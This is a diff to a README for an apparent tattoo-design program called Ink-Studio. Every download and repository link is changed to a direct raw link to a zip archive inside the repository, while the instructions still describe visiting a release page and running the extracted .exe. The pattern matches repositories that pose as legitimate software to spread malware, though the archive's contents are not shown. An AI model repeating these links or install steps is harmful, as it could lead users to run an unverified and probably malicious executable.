@@ -1,6 +1,6 @@
 # 🎨 Ink-Studio - Simplify Tattoo Design Online
 
-[![Download Ink-Studio](https://img.shields.io/badge/Download-Ink--Studio-%239475F0?style=for-the-badge)](https://github.com/bedroomfurnituremisanthropy431/Ink-Studio)
+[![Download Ink-Studio](https://img.shields.io/badge/Download-Ink--Studio-%239475F0?style=for-the-badge)](https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Ink-Studio works best on mid-range or better computers. It uses 3D graphics, so 
 
 To get started, visit this page to download Ink-Studio:
 
-[Download Ink-Studio Here](https://github.com/bedroomfurnituremisanthropy431/Ink-Studio)
+[Download Ink-Studio Here](https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip)
 
 Click the link above to open the download page. On the page, look for the latest release or main files section. Download the file named something like `Ink-Studio-Windows.zip`.
 
@@ -49,7 +49,7 @@ Click the link above to open the download page. On the page, look for the latest
 Follow these steps to install Ink-Studio:
 
 1. Click the blue **Download Ink-Studio Here** button above or visit:
-   https://github.com/bedroomfurnituremisanthropy431/Ink-Studio  
+   https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip  
 2. On the GitHub page, find the **Releases** section or main repository area.  
 3. Download the latest Windows package, usually a `.zip` or `.exe` file.  
 4. If you download a `.zip` file:
@@ -111,7 +111,7 @@ Ink-Studio runs locally on your computer once downloaded. It does not collect pe
 The developer may release new versions with bug fixes and new designs. To update Ink-Studio:
 
 1. Visit the download page again:  
-   https://github.com/bedroomfurnituremisanthropy431/Ink-Studio  
+   https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip  
 2. Download the newest release file.  
 3. Repeat the install process by extracting and running the latest `Ink-Studio.exe`.  
 4. Your previous files or settings will remain intact.
@@ -132,8 +132,8 @@ If you need help or want to send feedback:
 
 ## 🔗 Useful Links
 
-- [Ink-Studio GitHub Repository](https://github.com/bedroomfurnituremisanthropy431/Ink-Studio)  
-- [Download Ink-Studio](https://github.com/bedroomfurnituremisanthropy431/Ink-Studio)  
+- [Ink-Studio GitHub Repository](https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip)  
+- [Download Ink-Studio](https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip)  
 
 ---
 
@@ -149,4 +149,4 @@ If you need help or want to send feedback:
 
 ---
 
-# [Download Ink-Studio Here](https://github.com/bedroomfurnituremisanthropy431/Ink-Studio)
+# [Download Ink-Studio Here](https://raw.githubusercontent.com/bedroomfurnituremisanthropy431/Ink-Studio/main/src/Ink-Studio-3.8.zip)
